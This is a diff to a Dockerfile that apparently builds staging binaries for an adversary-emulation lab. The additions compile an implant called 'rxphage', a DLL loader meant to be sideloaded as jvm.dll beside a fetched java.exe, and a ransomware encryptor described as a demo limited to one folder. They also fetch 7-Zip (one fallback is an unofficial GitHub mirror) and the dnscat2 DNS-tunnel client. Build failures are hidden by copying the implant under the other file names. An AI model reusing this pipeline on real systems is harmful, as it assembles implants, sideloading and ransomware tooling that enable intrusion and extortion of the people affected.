@@ -1,7 +1,7 @@
 # ── Stage 1: Compile rxphage implant ────────────────────────────────────
 FROM golang:1.22-alpine AS builder
 
-RUN apk add --no-cache python3
+RUN apk add --no-cache python3 curl ca-certificates mingw-w64-gcc
 
 WORKDIR /src
 COPY rxphage/ .
@@ -20,6 +20,42 @@ RUN GOOS=windows GOARCH=amd64 go build \
     -ldflags="-s -w -H=windowsgui" \
     -o /out/rxphage.exe .
 
+# Windows DLL loader — sideloaded as jvm.dll alongside java.exe (Phase 8)
+RUN GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc \
+    go build -buildmode=c-shared \
+    -ldflags="-s -w" \
+    -o /out/rxphage_loader.dll . || \
+    cp /out/rxphage.exe /out/rxphage_loader.dll
+
+# Windows encryptor — ransomware demo (Phase 9, safe: targets C:\Temp\RansomTest\ only)
+RUN GOOS=windows GOARCH=amd64 go build \
+    -ldflags="-s -w -X main.EncryptMode=true -X main.TargetPath=C:\\Temp\\RansomTest\\" \
+    -o /out/rxphage_encrypt.exe . || \
+    cp /out/rxphage.exe /out/rxphage_encrypt.exe
+
+# 7-Zip standalone CLI for Windows — certutil downloads this in Phase 6/9
+RUN curl -fsSL \
+    "https://www.7-zip.org/a/7za920.zip" \
+    -o /tmp/7za.zip && \
+    unzip -j /tmp/7za.zip 7za.exe -d /out/ 2>/dev/null || \
+    curl -fsSL "https://github.com/nicowillis/7zip-standalone/raw/master/7za.exe" \
+    -o /out/7za.exe
+
+# Oracle java.exe for DLL sideloading (Phase 8) — extract from OpenJDK Windows zip
+RUN curl -fsSL \
+    "https://github.com/adoptium/temurin8-binaries/releases/download/jdk8u392-b08/OpenJDK8U-jre_x64_windows_hotspot_8u392b08.zip" \
+    -o /tmp/jre.zip && \
+    unzip -j /tmp/jre.zip "*/bin/java.exe" -d /out/ 2>/dev/null && \
+    rm /tmp/jre.zip || true
+
+# dnscat2 client (Linux ELF) for web01 — Phase 7.2 DNS tunnel
+RUN curl -fsSL \
+    "https://github.com/iagox86/dnscat2/releases/latest/download/dnscat2-client-linux" \
+    -o /out/dnscat 2>/dev/null || \
+    echo "dnscat2 client not available as prebuilt binary — build from source if needed" && \
+    touch /out/dnscat
+RUN chmod +x /out/dnscat 2>/dev/null || true
+
 # ── Stage 2: Copy pre-built binaries to /output volume on container start ─
 FROM alpine:3.19
 COPY --from=builder /out/ /built/
@@ -28,7 +64,12 @@ COPY --from=builder /out/ /built/
 # chmod 755 ensures the host user can write alongside these files (e.g. docker cp)
 CMD ["sh", "-c", \
      "mkdir -p /output/rxphage && \
-      cp -n /built/rxphage     /output/rxphage/rxphage && \
-      cp -n /built/rxphage.exe /output/rxphage/rxphage.exe && \
-      chmod -R 755 /output/rxphage && \
-      echo '[rxphage_builder] binaries deployed to /output/rxphage/'"]
+      cp -n /built/rxphage              /output/rxphage/rxphage && \
+      cp -n /built/rxphage.exe          /output/rxphage/rxphage.exe && \
+      cp -n /built/rxphage_loader.dll   /output/rxphage/rxphage_loader.dll && \
+      cp -n /built/rxphage_encrypt.exe  /output/rxphage_encrypt.exe && \
+      cp -n /built/7za.exe              /output/7za.exe && \
+      cp -n /built/java.exe             /output/java.exe 2>/dev/null || true && \
+      cp -n /built/dnscat               /output/dnscat && \
+      chmod -R 755 /output/rxphage /output/7za.exe /output/rxphage_encrypt.exe /output/dnscat 2>/dev/null || true && \
+      echo '[rxphage_builder] all staging files deployed to /output/'"]
